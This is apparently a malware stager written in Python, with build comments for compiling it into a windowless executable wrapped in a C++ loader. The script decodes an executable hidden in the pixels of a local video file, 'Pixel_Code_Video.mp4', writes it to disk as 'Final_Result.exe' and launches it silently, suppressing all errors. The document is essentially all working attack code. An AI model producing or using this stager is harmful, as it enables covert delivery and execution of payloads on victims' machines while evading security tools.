# pyinstaller --onefile --noconsole --icon=NONE Stager.py
# Stager.py -> Stager.exe -> base64 -> Loader.cpp -> Loader.exe

import imageio
import numpy as np
import os

def frames_to_bits_auto(frames):
    bits_list = []
    for frame in frames:
        gray = np.mean(frame, axis=2)
        h, w = gray.shape
        pixel_size_h = max(1, h // 256)
        pixel_size_w = max(1, w // 256)
        pixel_size = min(pixel_size_h, pixel_size_w)
        h_blocks = h // pixel_size
        w_blocks = w // pixel_size
        cropped = gray[:h_blocks * pixel_size, :w_blocks * pixel_size]
        reshaped = cropped.reshape(h_blocks, pixel_size, w_blocks, pixel_size)
        block_means = reshaped.mean(axis=(1, 3))
        block_bits = (block_means < 128).astype(np.uint8)
        bits_list.append(block_bits.ravel())
    if not bits_list:
        return np.array([], dtype=np.uint8)
    return np.concatenate(bits_list)

def bits_to_file(bits, output_file):
    remainder = bits.size % 8
    if remainder:
        bits = bits[: bits.size - remainder]
    if bits.size == 0:
        return False
    packed = np.packbits(bits, bitorder='big')
    try:
        with open(output_file, 'wb') as f:
            f.write(packed.tobytes())
        return True
    except:
        return False

def video_to_exe(video_path, output_name="Final_Result.exe"):
    if not os.path.exists(video_path):
        return False
    try:
        reader = imageio.get_reader(video_path, 'ffmpeg')
    except:
        return False

    frames = []
    try:
        for frame in reader:
            frames.append(frame)
    except:
        reader.close()
        return False
    reader.close()

    bits = frames_to_bits_auto(frames)
    return bits_to_file(bits, output_name)

if __name__ == "__main__":
    video_file = "Pixel_Code_Video.mp4"
    out_exe = "Final_Result.exe"
    success = video_to_exe(video_file, out_exe)
    if success and os.path.exists(out_exe):
        try:
            os.startfile(out_exe)  
        except:
            pass
